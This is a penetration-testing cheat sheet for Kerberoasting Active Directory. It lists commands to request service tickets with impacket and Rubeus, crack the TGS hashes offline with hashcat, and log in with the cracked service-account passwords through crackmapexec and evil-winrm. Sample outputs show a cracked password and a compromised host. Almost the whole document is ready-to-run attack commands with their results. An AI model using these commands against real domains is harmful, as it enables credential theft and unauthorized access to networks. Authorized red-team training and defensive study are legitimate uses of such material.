# KERBEROASTING

### Request service tickets

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

> Get TGS tickets for SPNs

**Why:** Any domain user can do this

<details>
<summary>Example Output</summary>

```
impacket-GetUserSPNs corp.local/john:Password1 -dc-ip 10.10.10.5 -request
$krb5tgs$23$*svc_sql$CORP.LOCAL$...

hashcat -m 13100 hash.txt rockyou.txt
svc_sql:SQLServiceP@ss!
(Kerberoasted service account password)
```
</details>

---

### Kerberoast with Rubeus

```bash
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
```

> From Windows foothold

**Why:** Alternative to impacket

<details>
<summary>Example Output</summary>

```
.\Rubeus.exe kerberoast /outfile:hashes.txt
[*] Found 2 Kerberoastable users
[*] SPN: MSSQLSvc/DB01:1433 - svc_sql
[*] Hash written to hashes.txt
```
</details>

---

### Crack TGS hashes

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

> Offline cracking

**Why:** Service account passwords

<details>
<summary>Example Output</summary>

```
hashcat -m 13100 hashes.txt rockyou.txt
$krb5tgs$23$*svc_sql*:SQLServiceP@ss!

Status: Cracked
Hash.Target: svc_sql
Password: SQLServiceP@ss!
```
</details>

---

### Use cracked password

```bash
crackmapexec smb <DC_IP> -u <svc_account> -p <cracked_pass>
evil-winrm if WinRM is open
```

> Access with service account

**Why:** Often has high privileges

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.5 -u svc_sql -p 'SQLServiceP@ss!'
[+] corp.local\svc_sql:SQLServiceP@ss! (Pwn3d!)

evil-winrm -i 10.10.10.5 -u svc_sql -p 'SQLServiceP@ss!'
*Evil-WinRM* PS> whoami
corp\svc_sql
```
</details>

---
